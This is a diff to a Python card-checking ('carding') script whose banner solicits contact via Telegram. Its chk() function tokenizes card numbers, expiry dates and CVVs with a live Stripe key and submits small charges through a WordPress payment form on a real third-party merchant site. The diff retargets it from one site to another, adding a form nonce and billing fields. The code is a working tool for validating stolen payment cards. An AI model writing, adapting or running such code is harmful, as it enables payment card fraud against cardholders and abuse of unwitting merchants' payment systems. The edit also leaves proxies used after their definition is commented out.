@@ -21,7 +21,7 @@ Contact me on tg @Xbinner2"""
 )
 
 amount = int(input(f"\namount=> "))
-p = input("\nproxy remote=> ")
+# p = input("\nproxy remote=> ")
 
 UA = "Mozilla/5.0 (Android 13; Mobile; rv:68.0) Gecko/68.0 Firefox/107.0"
 
@@ -35,7 +35,7 @@ def grab():
 
 def chk(CCN, MM, YY, CVV):
     s = requests.Session()
-    proxies = {"http":p,"https":p}
+    # proxies = {"http":p,"https":p}
     s.proxies.update(proxies)
     head = {
         "user-agent": UA,
@@ -74,7 +74,7 @@ def chk(CCN, MM, YY, CVV):
         "guid": Guid,
         "muid": Muid,
         "sid": Sid,
-        "key": "pk_live_5YHU0akiB45684n5IDUJePVi",
+        "key": "pk_live_4WOpSHSn6SRZyq1Lgv7Zm4Or",
         "card[number]": int(CCN),
         "card[exp_month]": MM,
         "card[exp_year]": int(YY),
@@ -89,14 +89,16 @@ def chk(CCN, MM, YY, CVV):
 
     load = {
         "action": "wp_full_stripe_payment_charge",
-        "formName": "online_payment",
+        "formName": "myform",
+        "formNonce": "0648fccb94",
+        "fullstripe_address_line1": Street,
+        "fullstripe_address_city": City,
+        "fullstripe_address_zip": Zip,
+        "fullstripe_address_state": State,
+        "fullstripe_address_country": "US",
         "fullstripe_name": Name,
         "fullstripe_email": Email,
         "fullstripe_custom_amount": amount,
-        "customAmount": "custom_amount",
-        "formDoRedirect": 0,
-        "formRedirectToPageOrPost": 1,
-        "sendEmailReceipt": 1,
         "stripeToken": Id,
     }
 
@@ -108,7 +110,7 @@ def chk(CCN, MM, YY, CVV):
     }
 
     rx = s.post(
-        "https://promofactor.com.au/ajax", headers=header, data=load
+        "https://www.cpadventure.ie/wp-admin/admin-ajax.php", headers=header, data=load
     )
     msg = rx.json()["msg"]
     
